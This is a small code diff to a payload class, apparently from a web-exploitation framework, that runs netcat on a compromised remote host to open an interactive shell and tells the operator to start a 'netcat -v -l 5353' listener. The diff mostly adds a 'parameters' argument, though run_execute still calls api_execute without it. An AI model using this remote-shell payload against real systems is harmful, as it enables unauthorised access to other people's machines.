@@ -9,7 +9,7 @@ class netcat_interactive_shell(base_payload):
     '''
     This payload runs netcat in the remote host and establishes an interactive shell.
     '''
-    def api_execute(self):
+    def api_execute(self, parameters):
 
         netcat_result = self.exec_payload('netcat_installed')
 
@@ -40,6 +40,7 @@ class netcat_interactive_shell(base_payload):
         @return: A message to show to the user. A new shell object is created and stored
         in the kb.
         '''
+        #    TODO: Make this muuuuuuch better!
         om.out.console('Please run the following command in your box:')
         om.out.console('netcat -v -l 5353')
         time.sleep(60)
@@ -54,7 +55,7 @@ class netcat_interactive_shell(base_payload):
         
         return True
     
-    def run_execute(self):
+    def run_execute(self, parameters):
         api_result = self.api_execute()
         return api_result
 
